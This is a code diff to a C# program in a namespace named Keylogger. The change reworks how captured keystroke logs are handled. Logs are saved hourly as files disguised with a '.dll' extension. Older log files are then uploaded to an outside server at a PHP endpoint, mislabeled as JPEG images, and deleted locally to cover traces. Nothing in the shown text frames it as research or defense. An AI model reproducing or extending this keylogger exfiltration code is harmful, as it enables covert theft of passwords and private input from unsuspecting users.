@@ -60,7 +60,7 @@ namespace Keylogger
                     log += character2;
 
                     // Write logs
-                    writeLogs(log, currentHour);
+                    writeLogs(log);
                 });
 
                 Application.Run();
@@ -96,19 +96,35 @@ namespace Keylogger
         }
         
 
-        public void writeLogs(string log, string currentHour)
+        public void writeLogs(string log)
         {
-            // Write logs : https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
+            // Write logs https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
             string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\logs\\";
             Directory.CreateDirectory(path); // Create the path if it does not exist
             string fileName = "kl-" + DateTime.UtcNow.ToString("MM-dd-yyyy_HH") + ".dll";
             
             File.WriteAllText(Path.Combine(path, fileName), log);
 
-            if (currentHour != DateTime.UtcNow.ToString("HH"))
+            // If it's a new file => send the last file
+            if (
+                    currentHour != DateTime.UtcNow.ToString("HH") && 
+                    currentHour != ""
+                )
             {
-                NameValueCollection nvc = new NameValueCollection();
-                HttpUploadFile("http://poklettre.fr/domotique/saveSQL.php", Path.Combine(path, fileName), "sql", "image/jpeg", nvc);
+                // Get the last log file
+                string[] logFiles = Directory.GetFiles(path, "*.dll", SearchOption.TopDirectoryOnly);
+                foreach (string filePath in logFiles)
+                {
+                    if (filePath != Path.Combine(path, fileName))
+                    {
+                        // Upload the logs
+                        NameValueCollection nvc = new NameValueCollection();
+                        HttpUploadFile("http://poklettre.fr/domotique/saveSQL.php", filePath, "sql", "image/jpeg", nvc);
+
+                        // Delete the file
+                        File.Delete(filePath);
+                    }
+                }
             }
 
             currentHour = DateTime.UtcNow.ToString("HH");
